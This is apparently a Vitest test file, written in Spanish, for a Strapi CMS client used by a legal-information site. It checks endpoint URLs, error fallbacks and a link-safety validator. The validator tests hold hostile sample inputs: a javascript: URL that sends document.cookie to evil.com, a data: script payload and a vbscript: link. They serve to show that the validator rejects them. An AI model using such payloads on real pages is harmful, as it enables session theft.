import { describe, it, expect, vi, beforeEach } from 'vitest';
import {
  fetchCollection,
  fetchSingle,
  fetchBySlug,
  fetchNormas,
  fetchNormaBySlug,
  fetchArticulos,
  fetchArticuloBySlug,
  fetchRecursosPedagogicos,
  fetchIntegrantesComite,
  fetchCapacitaciones,
  fetchComunicados,
  fetchCanalesAyuda,
  fetchQuienesSomos,
  fetchHome,
  getStrapiMediaUrl,
  isEnlaceSeguro,
} from '../../src/lib/strapi';
import type { StrapiMedia } from '../../src/lib/types';

beforeEach(() => {
  vi.unstubAllGlobals();
});

function mockFetchResponse(data: unknown, ok = true, status = 200) {
  return vi.fn().mockResolvedValue({
    ok,
    status,
    json: () => Promise.resolve(data),
  });
}

describe('fetchCollection (genérico)', () => {
  it('devuelve el array de datos en éxito', async () => {
    const mockData = { data: [{ id: 1, titulo: 'Ley 1010 de 2006' }], meta: {} };
    vi.stubGlobal('fetch', mockFetchResponse(mockData));

    const result = await fetchCollection('normas');
    expect(result).toEqual([{ id: 1, titulo: 'Ley 1010 de 2006' }]);
  });

  it('devuelve array vacío ante un error HTTP (nunca lanza)', async () => {
    vi.stubGlobal('fetch', mockFetchResponse({}, false, 500));

    const result = await fetchCollection('normas');
    expect(result).toEqual([]);
  });

  it('devuelve array vacío ante un fallo de red (nunca lanza)', async () => {
    vi.stubGlobal('fetch', vi.fn().mockRejectedValue(new Error('Network error')));

    const result = await fetchCollection('normas');
    expect(result).toEqual([]);
  });

  it('devuelve array vacío cuando data es null', async () => {
    vi.stubGlobal('fetch', mockFetchResponse({ data: null, meta: {} }));

    const result = await fetchCollection('normas');
    expect(result).toEqual([]);
  });

  it('construye el query string con los parámetros dados', async () => {
    const mockFetch = mockFetchResponse({ data: [], meta: {} });
    vi.stubGlobal('fetch', mockFetch);

    await fetchCollection('normas', {
      populate: '*',
      sort: 'anio:desc',
      pagination: { page: 1, pageSize: 10 },
    });

    const calledUrl = mockFetch.mock.calls[0][0] as string;
    expect(calledUrl).toContain('populate=');
    expect(calledUrl).toContain('sort=');
    expect(calledUrl).toContain('pagination');
  });
});

describe('fetchSingle (genérico)', () => {
  it('devuelve el dato en éxito', async () => {
    const mockData = { data: { id: 1, titulo_hero: 'Justicia Sana' }, meta: {} };
    vi.stubGlobal('fetch', mockFetchResponse(mockData));

    const result = await fetchSingle('home');
    expect(result).toEqual({ id: 1, titulo_hero: 'Justicia Sana' });
  });

  it('devuelve null ante un error HTTP (nunca lanza)', async () => {
    vi.stubGlobal('fetch', mockFetchResponse({}, false, 404));

    const result = await fetchSingle('home');
    expect(result).toBeNull();
  });

  it('devuelve null ante un fallo de red (nunca lanza)', async () => {
    vi.stubGlobal('fetch', vi.fn().mockRejectedValue(new Error('Timeout')));

    const result = await fetchSingle('home');
    expect(result).toBeNull();
  });
});

describe('fetchBySlug (genérico)', () => {
  it('devuelve el primer elemento coincidente', async () => {
    const mockData = { data: [{ id: 1, slug: 'ley-1010-2006', titulo: 'Ley 1010' }], meta: {} };
    vi.stubGlobal('fetch', mockFetchResponse(mockData));

    const result = await fetchBySlug('normas', 'ley-1010-2006');
    expect(result).toEqual({ id: 1, slug: 'ley-1010-2006', titulo: 'Ley 1010' });
  });

  it('devuelve null cuando no hay coincidencia', async () => {
    vi.stubGlobal('fetch', mockFetchResponse({ data: [], meta: {} }));

    const result = await fetchBySlug('normas', 'inexistente');
    expect(result).toBeNull();
  });
});

describe('funciones de dominio — apuntan al endpoint correcto y degradan con gracia', () => {
  const domainFns: ReadonlyArray<{ name: string; fn: () => Promise<unknown>; endpoint: string }> = [
    { name: 'fetchNormas', fn: fetchNormas, endpoint: 'normas' },
    { name: 'fetchArticulos', fn: fetchArticulos, endpoint: 'articulos' },
    {
      name: 'fetchRecursosPedagogicos',
      fn: fetchRecursosPedagogicos,
      endpoint: 'recursos-pedagogicos',
    },
    {
      name: 'fetchIntegrantesComite',
      fn: fetchIntegrantesComite,
      endpoint: 'integrantes-comite',
    },
    { name: 'fetchCapacitaciones', fn: fetchCapacitaciones, endpoint: 'capacitaciones' },
    { name: 'fetchComunicados', fn: fetchComunicados, endpoint: 'comunicados' },
    { name: 'fetchCanalesAyuda', fn: fetchCanalesAyuda, endpoint: 'canales-ayuda' },
  ];

  for (const { name, fn, endpoint } of domainFns) {
    it(`${name} llama al endpoint "${endpoint}" y devuelve [] si Strapi falla`, async () => {
      const mockFetch = mockFetchResponse({}, false, 500);
      vi.stubGlobal('fetch', mockFetch);

      const result = await fn();

      expect(result).toEqual([]);
      const calledUrl = mockFetch.mock.calls[0][0] as string;
      expect(calledUrl).toContain(`/api/${endpoint}`);
    });
  }

  it('fetchNormaBySlug busca por slug en el endpoint "normas"', async () => {
    const mockFetch = mockFetchResponse({
      data: [{ id: 1, slug: 'ley-1010-2006', titulo: 'Ley 1010' }],
      meta: {},
    });
    vi.stubGlobal('fetch', mockFetch);

    const result = await fetchNormaBySlug('ley-1010-2006');

    expect(result).not.toBeNull();
    const calledUrl = mockFetch.mock.calls[0][0] as string;
    expect(calledUrl).toContain('/api/normas');
  });

  it('fetchArticuloBySlug busca por slug en el endpoint "articulos"', async () => {
    const mockFetch = mockFetchResponse({ data: [], meta: {} });
    vi.stubGlobal('fetch', mockFetch);

    await fetchArticuloBySlug('inexistente');

    const calledUrl = mockFetch.mock.calls[0][0] as string;
    expect(calledUrl).toContain('/api/articulos');
  });

  it('fetchQuienesSomos llama al single type "quienes-somos" y devuelve null si Strapi falla', async () => {
    const mockFetch = mockFetchResponse({}, false, 500);
    vi.stubGlobal('fetch', mockFetch);

    const result = await fetchQuienesSomos();

    expect(result).toBeNull();
    const calledUrl = mockFetch.mock.calls[0][0] as string;
    expect(calledUrl).toContain('/api/quienes-somos');
  });

  it('fetchHome llama al single type "home" y devuelve null si Strapi falla', async () => {
    const mockFetch = mockFetchResponse({}, false, 500);
    vi.stubGlobal('fetch', mockFetch);

    const result = await fetchHome();

    expect(result).toBeNull();
    const calledUrl = mockFetch.mock.calls[0][0] as string;
    expect(calledUrl).toContain('/api/home');
  });
});

describe('getStrapiMediaUrl (F3-01/03 — hallazgo AUDIT_04)', () => {
  function media(url: string): StrapiMedia {
    return { id: 1, url, alternativeText: null, width: null, height: null };
  }

  it('prefija con STRAPI_URL una URL relativa (proveedor local de Strapi)', () => {
    expect(getStrapiMediaUrl(media('/uploads/reglamento_abc.pdf'))).toBe(
      'https://cms.sprintjudicial.com/uploads/reglamento_abc.pdf',
    );
  });

  it('deja intacta una URL ya absoluta (proveedor externo tipo CDN)', () => {
    expect(getStrapiMediaUrl(media('https://cdn.externo.com/archivo.pdf'))).toBe(
      'https://cdn.externo.com/archivo.pdf',
    );
  });
});

describe('isEnlaceSeguro (F3-03/06 — hallazgo AUDIT_04)', () => {
  it('acepta http y https', () => {
    expect(isEnlaceSeguro('https://youtube.com/watch?v=abc')).toBe(true);
    expect(isEnlaceSeguro('http://ejemplo.com/formulario')).toBe(true);
  });

  it('rechaza javascript: (XSS si una cuenta editora de Strapi es comprometida)', () => {
    expect(isEnlaceSeguro("javascript:fetch('//evil.com/'+document.cookie)")).toBe(false);
  });

  it('rechaza data: y otros esquemas no http(s)', () => {
    expect(isEnlaceSeguro('data:text/html,<script>alert(1)</script>')).toBe(false);
    expect(isEnlaceSeguro('vbscript:msgbox(1)')).toBe(false);
  });
});

describe('seguridad — nunca lanza excepciones', () => {
  it('un JSON inválido en la respuesta no lanza, degrada a valor vacío', async () => {
    vi.stubGlobal(
      'fetch',
      vi.fn().mockResolvedValue({
        ok: true,
        status: 200,
        json: () => Promise.reject(new Error('invalid json')),
      }),
    );

    await expect(fetchCollection('normas')).resolves.toEqual([]);
    await expect(fetchSingle('home')).resolves.toBeNull();
  });
});
